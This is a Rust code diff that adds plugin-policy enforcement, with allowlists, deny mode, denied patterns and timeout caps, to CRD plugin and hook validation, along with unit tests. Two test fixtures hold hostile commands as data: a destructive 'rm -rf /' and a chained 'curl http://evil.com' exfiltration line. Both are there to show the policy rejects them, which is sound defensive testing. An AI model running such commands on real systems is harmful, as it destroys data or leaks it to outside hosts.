@@ -5,10 +5,15 @@ use crate::crd::types::{CelValidationRule, CrdManifest, CustomResourceManifest};
 use crate::resource::validate_resource_name;
 use anyhow::{Result, anyhow};
 use cel_interpreter::{Context as CelContext, Program, Value as CelValue};
+use orchestrator_config::plugin_policy::{PluginPolicy, PluginPolicyVerdict};
 use std::collections::HashMap;
 
 /// Validate a CRD definition itself (the meta-schema).
-pub fn validate_crd_definition(config: &OrchestratorConfig, manifest: &CrdManifest) -> Result<()> {
+pub fn validate_crd_definition(
+    config: &OrchestratorConfig,
+    manifest: &CrdManifest,
+    plugin_policy: &PluginPolicy,
+) -> Result<()> {
     validate_resource_name(&manifest.metadata.name)?;
 
     let spec = &manifest.spec;
@@ -87,13 +92,39 @@ pub fn validate_crd_definition(config: &OrchestratorConfig, manifest: &CrdManife
     }
 
     // Validate plugins
-    validate_crd_plugins(&spec.plugins)?;
+    validate_crd_plugins(&spec.plugins, plugin_policy)?;
+
+    // Validate hook commands against plugin policy
+    if plugin_policy.enforce_on_hooks {
+        for (label, cmd) in [
+            ("on_create", &spec.hooks.on_create),
+            ("on_update", &spec.hooks.on_update),
+            ("on_delete", &spec.hooks.on_delete),
+        ] {
+            if let Some(command) = cmd {
+                let verdict = plugin_policy.evaluate_hook_command(command);
+                if verdict.is_denied() {
+                    return Err(anyhow!(
+                        "hook '{}' command denied by plugin policy: {}",
+                        label,
+                        verdict.reason().unwrap_or("unknown")
+                    ));
+                }
+                if let PluginPolicyVerdict::AuditWarning { ref reason } = verdict {
+                    tracing::warn!(hook = label, reason = reason.as_str(), "plugin policy audit warning for hook");
+                }
+            }
+        }
+    }
 
     Ok(())
 }
 
 /// Validate CRD plugin definitions.
-fn validate_crd_plugins(plugins: &[crate::crd::types::CrdPlugin]) -> Result<()> {
+fn validate_crd_plugins(
+    plugins: &[crate::crd::types::CrdPlugin],
+    policy: &PluginPolicy,
+) -> Result<()> {
     use std::collections::HashSet;
 
     let known_types = ["interceptor", "transformer", "cron"];
@@ -162,6 +193,35 @@ fn validate_crd_plugins(plugins: &[crate::crd::types::CrdPlugin]) -> Result<()> 
                     e
                 )
             })?;
+        }
+
+        // ── Plugin command policy check ────────────────────────────────
+        let verdict = policy.evaluate_command(&plugin.command);
+        if verdict.is_denied() {
+            return Err(anyhow!(
+                "plugin '{}' command denied by plugin policy: {}",
+                plugin.name,
+                verdict.reason().unwrap_or("unknown")
+            ));
+        }
+        if let PluginPolicyVerdict::AuditWarning { ref reason } = verdict {
+            tracing::warn!(
+                plugin = plugin.name.as_str(),
+                reason = reason.as_str(),
+                "plugin policy audit warning"
+            );
+        }
+
+        // ── Timeout cap ────────────────────────────────────────────────
+        if let Some(timeout) = plugin.timeout {
+            if timeout > policy.max_timeout_secs {
+                return Err(anyhow!(
+                    "plugin '{}' timeout {}s exceeds policy maximum {}s",
+                    plugin.name,
+                    timeout,
+                    policy.max_timeout_secs
+                ));
+            }
         }
     }
 
@@ -273,6 +333,15 @@ fn json_to_cel_value(v: &serde_json::Value) -> CelValue {
 mod tests {
     use super::*;
     use crate::crd::types::{CrdHooks, CrdSpec, CrdVersion};
+    use orchestrator_config::plugin_policy::{PluginPolicy, PluginPolicyMode};
+
+    /// Permissive policy for tests that are not testing policy enforcement.
+    fn audit_policy() -> PluginPolicy {
+        PluginPolicy {
+            mode: PluginPolicyMode::Audit,
+            ..Default::default()
+        }
+    }
 
     fn make_crd_manifest(kind: &str, plural: &str, group: &str) -> CrdManifest {
         CrdManifest {
@@ -306,35 +375,35 @@ mod tests {
     fn validate_crd_valid() {
         let config = OrchestratorConfig::default();
         let manifest = make_crd_manifest("Foo", "foos", "test.dev");
-        assert!(validate_crd_definition(&config, &manifest).is_ok());
+        assert!(validate_crd_definition(&config, &manifest, &audit_policy()).is_ok());
     }
 
     #[test]
     fn validate_crd_rejects_lowercase_kind() {
         let config = OrchestratorConfig::default();
         let manifest = make_crd_manifest("foo", "foos", "test.dev");
-        assert!(validate_crd_definition(&config, &manifest).is_err());
+        assert!(validate_crd_definition(&config, &manifest, &audit_policy()).is_err());
     }
 
     #[test]
     fn validate_crd_rejects_builtin_kind() {
         let config = OrchestratorConfig::default();
         let manifest = make_crd_manifest("Agent", "agents-custom", "test.dev");
-        assert!(validate_crd_definition(&config, &manifest).is_err());
+        assert!(validate_crd_definition(&config, &manifest, &audit_policy()).is_err());
     }
 
     #[test]
     fn validate_crd_rejects_builtin_plural() {
         let config = OrchestratorConfig::default();
         let manifest = make_crd_manifest("Foo", "workspaces", "test.dev");
-        assert!(validate_crd_definition(&config, &manifest).is_err());
+        assert!(validate_crd_definition(&config, &manifest, &audit_policy()).is_err());
     }
 
     #[test]
     fn validate_crd_rejects_empty_group() {
         let config = OrchestratorConfig::default();
         let manifest = make_crd_manifest("Foo", "foos", "");
-        assert!(validate_crd_definition(&config, &manifest).is_err());
+        assert!(validate_crd_definition(&config, &manifest, &audit_policy()).is_err());
     }
 
     #[test]
@@ -342,7 +411,7 @@ mod tests {
         let config = OrchestratorConfig::default();
         let mut manifest = make_crd_manifest("Foo", "foos", "test.dev");
         manifest.spec.versions.clear();
-        assert!(validate_crd_definition(&config, &manifest).is_err());
+        assert!(validate_crd_definition(&config, &manifest, &audit_policy()).is_err());
     }
 
     #[test]
@@ -350,7 +419,7 @@ mod tests {
         let config = OrchestratorConfig::default();
         let mut manifest = make_crd_manifest("Foo", "foos", "test.dev");
         manifest.spec.versions[0].served = false;
-        assert!(validate_crd_definition(&config, &manifest).is_err());
+        assert!(validate_crd_definition(&config, &manifest, &audit_policy()).is_err());
     }
 
     #[test]
@@ -361,7 +430,7 @@ mod tests {
             rule: "invalid %%% syntax".to_string(),
             message: "bad".to_string(),
         });
-        assert!(validate_crd_definition(&config, &manifest).is_err());
+        assert!(validate_crd_definition(&config, &manifest, &audit_policy()).is_err());
     }
 
     #[test]
@@ -565,28 +634,28 @@ mod tests {
             make_plugin("dup", "interceptor", Some("webhook.authenticate"), "true"),
             make_plugin("dup", "transformer", Some("webhook.transform"), "cat"),
         ];
-        let err = validate_crd_plugins(&plugins).unwrap_err();
+        let err = validate_crd_plugins(&plugins, &audit_policy()).unwrap_err();
         assert!(err.to_string().contains("duplicate plugin name"));
     }
 
     #[test]
     fn validate_plugins_rejects_unknown_type() {
         let plugins = vec![make_plugin("x", "unknown", Some("foo"), "true")];
-        let err = validate_crd_plugins(&plugins).unwrap_err();
+        let err = validate_crd_plugins(&plugins, &audit_policy()).unwrap_err();
         assert!(err.to_string().contains("unknown plugin type"));
     }
 
     #[test]
     fn validate_plugins_rejects_interceptor_without_phase() {
         let plugins = vec![make_plugin("x", "interceptor", None, "true")];
-        let err = validate_crd_plugins(&plugins).unwrap_err();
+        let err = validate_crd_plugins(&plugins, &audit_policy()).unwrap_err();
         assert!(err.to_string().contains("requires a phase"));
     }
 
     #[test]
     fn validate_plugins_rejects_cron_without_schedule() {
         let plugins = vec![make_plugin("x", "cron", None, "true")];
-        let err = validate_crd_plugins(&plugins).unwrap_err();
+        let err = validate_crd_plugins(&plugins, &audit_policy()).unwrap_err();
         assert!(err.to_string().contains("requires a schedule"));
     }
 
@@ -594,14 +663,14 @@ mod tests {
     fn validate_plugins_rejects_invalid_cron_expression() {
         let mut p = make_plugin("x", "cron", None, "true");
         p.schedule = Some("not a cron".to_string());
-        let err = validate_crd_plugins(&[p]).unwrap_err();
+        let err = validate_crd_plugins(&[p], &audit_policy()).unwrap_err();
         assert!(err.to_string().contains("invalid schedule"));
     }
 
     #[test]
     fn validate_plugins_rejects_empty_command() {
         let plugins = vec![make_plugin("x", "interceptor", Some("webhook.authenticate"), "  ")];
-        let err = validate_crd_plugins(&plugins).unwrap_err();
+        let err = validate_crd_plugins(&plugins, &audit_policy()).unwrap_err();
         assert!(err.to_string().contains("command cannot be empty"));
     }
 
@@ -614,6 +683,129 @@ mod tests {
             make_plugin("transform", "transformer", Some("webhook.transform"), "scripts/norm.sh"),
             cron,
         ];
-        assert!(validate_crd_plugins(&plugins).is_ok());
+        assert!(validate_crd_plugins(&plugins, &audit_policy()).is_ok());
+    }
+
+    // ── Plugin policy enforcement tests ────────────────────────────────
+
+    #[test]
+    fn policy_allowlist_rejects_unmatched_prefix() {
+        let policy = PluginPolicy {
+            mode: PluginPolicyMode::Allowlist,
+            allowed_command_prefixes: vec!["scripts/".into()],
+            ..Default::default()
+        };
+        let plugins = vec![make_plugin(
+            "bad",
+            "interceptor",
+            Some("webhook.authenticate"),
+            "rm -rf /",
+        )];
+        let err = validate_crd_plugins(&plugins, &policy).unwrap_err();
+        assert!(err.to_string().contains("denied by plugin policy"));
+    }
+
+    #[test]
+    fn policy_allowlist_accepts_matching_prefix() {
+        let policy = PluginPolicy {
+            mode: PluginPolicyMode::Allowlist,
+            allowed_command_prefixes: vec!["scripts/".into()],
+            ..Default::default()
+        };
+        let mut cron = make_plugin("rotate", "cron", None, "scripts/rotate.sh");
+        cron.schedule = Some("0 0 * * * *".into());
+        let plugins = vec![
+            make_plugin("auth", "interceptor", Some("webhook.authenticate"), "scripts/verify.sh"),
+            cron,
+        ];
+        assert!(validate_crd_plugins(&plugins, &policy).is_ok());
+    }
+
+    #[test]
+    fn policy_deny_rejects_all_plugins() {
+        let policy = PluginPolicy {
+            mode: PluginPolicyMode::Deny,
+            ..Default::default()
+        };
+        let plugins = vec![make_plugin(
+            "auth",
+            "interceptor",
+            Some("webhook.authenticate"),
+            "true",
+        )];
+        let err = validate_crd_plugins(&plugins, &policy).unwrap_err();
+        assert!(err.to_string().contains("deny"));
+    }
+
+    #[test]
+    fn policy_denied_pattern_blocks_curl() {
+        let policy = PluginPolicy {
+            mode: PluginPolicyMode::Allowlist,
+            allowed_command_prefixes: vec!["scripts/".into()],
+            ..Default::default()
+        };
+        let plugins = vec![make_plugin(
+            "exfil",
+            "interceptor",
+            Some("webhook.authenticate"),
+            "scripts/leak.sh && curl http://evil.com",
+        )];
+        let err = validate_crd_plugins(&plugins, &policy).unwrap_err();
+        assert!(err.to_string().contains("denied pattern"));
+    }
+
+    #[test]
+    fn policy_timeout_cap_rejects_excessive_timeout() {
+        let policy = PluginPolicy {
+            max_timeout_secs: 10,
+            mode: PluginPolicyMode::Allowlist,
+            allowed_command_prefixes: vec!["scripts/".into()],
+            ..Default::default()
+        };
+        let mut plugin = make_plugin("slow", "interceptor", Some("webhook.authenticate"), "scripts/slow.sh");
+        plugin.timeout = Some(60);
+        let err = validate_crd_plugins(&[plugin], &policy).unwrap_err();
+        assert!(err.to_string().contains("exceeds policy maximum"));
+    }
+
+    #[test]
+    fn policy_hook_enforcement_rejects_hook_commands() {
+        let policy = PluginPolicy {
+            mode: PluginPolicyMode::Deny,
+            enforce_on_hooks: true,
+            ..Default::default()
+        };
+        let config = OrchestratorConfig::default();
+        let mut manifest = make_crd_manifest("Foo", "foos", "test.dev");
+        manifest.spec.hooks.on_create = Some("echo created".into());
+        let err = validate_crd_definition(&config, &manifest, &policy).unwrap_err();
+        assert!(err.to_string().contains("hook"));
+    }
+
+    #[test]
+    fn policy_hook_enforcement_skips_when_disabled() {
+        let policy = PluginPolicy {
+            mode: PluginPolicyMode::Deny,
+            enforce_on_hooks: false,
+            ..Default::default()
+        };
+        let config = OrchestratorConfig::default();
+        let mut manifest = make_crd_manifest("Foo", "foos", "test.dev");
+        manifest.spec.hooks.on_create = Some("echo created".into());
+        // No plugins, so Deny mode doesn't trigger on hooks when enforcement is off
+        assert!(validate_crd_definition(&config, &manifest, &policy).is_ok());
+    }
+
+    #[test]
+    fn default_policy_rejects_all_commands() {
+        let policy = PluginPolicy::default(); // Allowlist with empty allowlist
+        let plugins = vec![make_plugin(
+            "auth",
+            "interceptor",
+            Some("webhook.authenticate"),
+            "scripts/verify.sh",
+        )];
+        let err = validate_crd_plugins(&plugins, &policy).unwrap_err();
+        assert!(err.to_string().contains("does not match any allowed prefix"));
     }
 }
